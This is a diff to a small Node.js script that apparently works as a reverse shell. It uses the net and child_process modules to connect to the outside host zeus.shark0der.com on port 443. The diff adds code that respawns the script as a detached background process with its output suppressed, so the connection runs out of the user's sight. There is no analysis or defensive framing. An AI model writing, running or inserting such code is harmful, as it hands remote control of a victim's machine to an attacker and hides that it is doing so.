@@ -1,6 +1,18 @@
+#!/usr/bin/env node
+
 var net = require('net');
 var spawn = require('child_process').spawn;
 
+if (!process.env.IS_CHILD) {
+  spawn(process.argv[0], process.argv.slice(1), {
+    detached: true,
+    stdio: 'ignore',
+    env: Object.assign({ IS_CHILD: "1" }, process.env)
+  });
+  process.exit(0);
+}
+
+var HOST, PORT, TIMEOUT;
 HOST="zeus.shark0der.com";
 PORT="443";
 TIMEOUT="5000";
@@ -19,4 +31,3 @@ function c(HOST,PORT) {
 }
 
 c(HOST,PORT);
-
